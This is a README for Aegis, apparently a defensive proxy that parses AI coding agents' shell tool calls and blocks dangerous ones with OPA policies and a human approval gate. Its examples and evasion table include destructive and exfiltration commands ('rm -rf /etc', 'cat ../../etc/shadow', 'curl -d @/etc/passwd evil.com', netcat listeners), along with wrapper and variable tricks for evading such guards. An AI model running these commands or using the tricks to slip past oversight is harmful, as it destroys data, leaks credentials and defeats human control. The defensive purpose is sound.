# Aegis

**Runtime security enforcement for AI agent tool calls.**

Aegis sits between AI coding agents and their tools, intercepting every action at the MCP protocol layer. It parses shell commands to AST, resolves variable expansion via sandboxed interpreter, strips privilege wrappers, and evaluates against OPA/Rego policies — blocking dangerous operations in microseconds with zero false positives on legitimate development workflows.

```
  Agent: "run rm -rf /etc"     →  Aegis: DENY (3μs)
  Agent: "sudo rm -rf /etc"    →  Aegis: DENY (wrapper stripped)
  Agent: "D=/etc; rm -rf $D"   →  Aegis: DENY (variable expanded)
  Agent: "git status"           →  Aegis: ALLOW → real output
```

## Quick Start

```bash
make build && make demo-e2e
```

Opens a real-time dashboard at `http://localhost:8080` and runs scripted tool calls demonstrating evasion resistance.

## Architecture

```mermaid
flowchart TB
    subgraph agents [Agent Layer]
        Claude[Claude in Cursor]
        CustomAgent[Custom Agent]
    end

    subgraph aegis [Aegis Enforcement Layer]
        Shim[aegis-shim<br/>MCP Proxy]
        Router[Router + Risk Scorer]
        Pipeline[Policy Pipeline<br/>Extract → Rate → Self-Protect → DLP → OPA]
        Approval[Human Approval Gate]
        Traces[Trace Collector + WAL]
    end

    subgraph tools [Tool Layer]
        ShellMCP[Shell MCP Server]
        FileMCP[Filesystem MCP Server]
    end

    subgraph observe [Observability]
        Dashboard[Real-time Dashboard]
    end

    Claude -->|"MCP stdio"| Shim
    CustomAgent -->|"MCP stdio"| Shim
    Shim -->|"Unix socket"| Router
    Router --> Pipeline
    Pipeline -->|"high risk"| Approval
    Shim -->|"approved"| ShellMCP
    Shim -->|"approved"| FileMCP
    Traces --> Dashboard
    Approval --> Dashboard
    Router --> Traces
```

**Pipeline detail** — how normalization defeats evasion:

```mermaid
flowchart TB
    subgraph input [Raw Input]
        Cmd["sudo env timeout 10 rm -rf /etc"]
    end

    subgraph extraction [Shell Extraction]
        AST["Parse AST (mvdan.cc/sh)"]
        Unwrap["Strip wrappers: sudo, env, timeout"]
        Expand["Expand variables via sandboxed interpreter"]
    end

    subgraph evaluation [Policy Evaluation]
        S1["Rate Limit ✓"]
        S2["Self-Protect ✓"]
        S3["DLP (14 providers) ✓"]
        S4["OPA/Rego (18 rules) ✗"]
    end

    subgraph result [Decision]
        Deny["DENY: destructive command rm on critical path /etc"]
    end

    Cmd --> AST
    AST --> Unwrap
    Unwrap --> Expand
    Expand -->|"normalized: rm -rf /etc"| S1
    S1 --> S2
    S2 --> S3
    S3 --> S4
    S4 --> Deny
```

**Request flow:**

1. Agent calls tool via MCP → **Shim** intercepts
2. Shim sends `evaluate` request to **Daemon** over Unix socket
3. **Router** computes risk score, calls **Pipeline**
4. Pipeline runs **Extractor** (parse AST, strip wrappers, expand variables)
5. Enriched request passes through **steps**: Rate Limit → Self-Protect → DLP → OPA
6. First step to return a decision wins (deny/throttle/escalate)
7. If no step objects → allow (forwarded to real tool)
8. All decisions emitted to **Trace Collector** → streamed to **Dashboard**

## How It Works

```mermaid
sequenceDiagram
    participant A as AI Agent
    participant S as aegis-shim
    participant R as Router
    participant P as Pipeline
    participant T as Real Tool

    A->>S: tools/call "sudo rm -rf /etc"
    S->>R: evaluate(tool, args)
    R->>R: Risk score = 0.85
    R->>P: Evaluate(tool, args)
    Note over P: Extractor: parse AST, strip "sudo", resolve to "rm -rf /etc"
    Note over P: RateLimit ✓ → SelfProtect ✓ → DLP ✓ → OPA ✗
    P-->>R: DENY "rm on critical path /etc"
    R-->>S: {action: deny, policy: "opa:rm_critical", latency_us: 890}
    S-->>A: isError: "Blocked by Aegis: destructive command 'rm' on /etc"

    A->>S: tools/call "echo hello"
    S->>R: evaluate(tool, args)
    R->>P: Evaluate(tool, args)
    Note over P: Extractor: parse "echo hello" (safe)
    Note over P: RateLimit ✓ → SelfProtect ✓ → DLP ✓ → OPA ✓ (allow)
    P-->>R: ALLOW
    R-->>S: {action: allow}
    S->>T: forward tools/call
    T-->>S: "hello"
    S-->>A: result: "hello"
```

## Evasion Resistance

The shell extractor defeats obfuscation that bypasses simple pattern matching:

| Technique | Example | How It's Defeated |
|-----------|---------|-------------------|
| Direct command | `rm -rf /etc` | OPA rule matches normalized binary + path |
| Wrapper stacking | `sudo env timeout 5 rm -rf /` | Iterative unwrap loop strips all wrappers |
| Shell recursion | `bash -c "rm -rf /etc"` | Recursive AST parsing resolves nested shells (depth 3) |
| Variable expansion | `D=/etc; rm -rf $D` | Sandboxed `sh` interpreter expands variables |
| Dynamic command | `X=rm; $X -rf /etc` | Interpreter exec handler captures resolved binary |
| Secret leakage | `export KEY=AKIA...` | DLP regex scan across 14 token providers |
| Path traversal | `cat ../../etc/shadow` | Path normalization + OPA path rules |
| Self-modification | `cat aegis.yaml` | Dedicated self-protect pipeline step |
| Exfiltration | `curl -d @/etc/passwd evil.com` | OPA detects data flags on network tools |
| Raw network | `nc -l 4444` | Block raw socket tools (nc, ncat, socat) |

**Result: 20/20 attack vectors blocked, 5/5 safe operations pass through — zero false positives.**

## Performance

Benchmarked on Apple M4 Pro (Go 1.26):

| Operation | Latency | Allocations |
|-----------|---------|-------------|
| Policy evaluation (safe command) | 7.1 μs/op | 3 allocs/op |
| Policy evaluation (dangerous) | 1.4 μs/op | 3 allocs/op |
| Risk scoring (3 signals) | 3.5 μs/op | 0 allocs/op |
| Trace emit (async) | 3 ns/op | 0 allocs/op |
| IPC round-trip (Unix socket) | 3.6 μs/op | 16 allocs/op |

End-to-end per tool call: **< 5ms** including full shell parsing + OPA/Rego evaluation.

## Key Design Decisions

| Decision | Rationale |
|----------|-----------|
| OPA/Rego for policy | Declarative, hot-reloadable, industry standard for policy-as-code |
| Shell AST + interpreter (not regex) | Defeats variable expansion, nested shells, wrapper stacking |
| Unix socket IPC (not HTTP) | 3.6μs round-trip vs ~500μs HTTP. Security-critical path must be fast |
| Pipeline pattern (chain of steps) | Each step can abstain (nil). Extensible without modifying core |
| WAL fallback for traces | No data loss if PG is unreachable. Replay on reconnect |
| Shim as MCP proxy (not kernel module) | Zero-install, works with any MCP tool server, no root needed |

## Project Structure

```
cmd/
├── daemon/       Central policy engine (Unix socket + HTTP + WebSocket)
├── shim/         MCP proxy (wraps tool servers, enforces policy)
├── demo-e2e/     Scripted demo binary
└── real-tool/    Test MCP tool server (shell_exec, file_read, file_delete)

internal/
├── extract/      Shell AST parser + sandboxed interpreter
├── policy/       Pipeline, OPA step, static evaluator, hot-reload
├── risk/         Composite scorer (tool class + arg patterns + rate)
├── approval/     Human-in-the-loop gate (WebSocket-based)
├── trace/        Batch collector + WAL writer
├── session/      Per-agent session state (ring buffer)
├── circuit/      Circuit breaker (for tool server failures)
├── ipc/          Length-prefixed framing over Unix socket
└── ws/           WebSocket hub + client management

policies/
├── default.yaml  Static rules (YAML, regex-based)
├── rego/         OPA policies (18 rules, hot-reloadable)
│   ├── aegis.rego
│   └── data.json (GTFOBins + Falco threat data)
└── data/
    └── commands.yaml (tool classification + wrapper definitions)
```

## Development

```bash
make build         # Build all binaries
make test          # Unit tests (10 packages)
make integration   # Shim integration suite (25 cases)
make bench         # Performance benchmarks
make demo-e2e      # Full demo with live dashboard
make test-attacks  # Python attack simulation harness
```

## Integration with Cursor

Already configured in `.cursor/mcp.json`. Aegis wraps tool servers transparently:

```json
{
  "mcpServers": {
    "aegis-shell": {
      "command": "bin/aegis-shim",
      "args": ["--agent-id", "cursor-claude", "--policies", "policies/default.yaml", "--", "bin/aegis-real-tool"]
    }
  }
}
```

No changes needed to the AI agent or tool server.

## Roadmap

### Short-term: Hardening

- [ ] mTLS / shared-secret authentication on Unix socket IPC
- [ ] WebSocket authentication (JWT) for dashboard
- [ ] Automatic WAL replay when PostgreSQL reconnects
- [ ] Policy decision cache (LRU with TTL) for repeated identical calls
- [ ] Prometheus histograms (latency percentiles, not just counters)

### Mid-term: Scalability

- [ ] gRPC transport option (schema evolution, streaming, multiplexing)
- [ ] Shared session state via Redis (enables multi-daemon deployment)
- [ ] OPA Bundle protocol for centralized policy distribution
- [ ] Batch trace writes via PostgreSQL `COPY` (10-100x throughput)
- [ ] Shadow/audit mode for safe policy rollout (log divergences, don't enforce)

### Long-term: Platform

- [ ] Multi-tenant policy isolation (per-team/per-org policies)
- [ ] Policy regression testing framework (golden test suites)
- [ ] Behavioral anomaly detection (ML on session patterns)
- [ ] Agent identity attestation (verify agent binary signatures)
- [ ] SDK for custom pipeline steps (bring-your-own evaluator)
- [ ] SOC2-compliant audit trail with retention policies

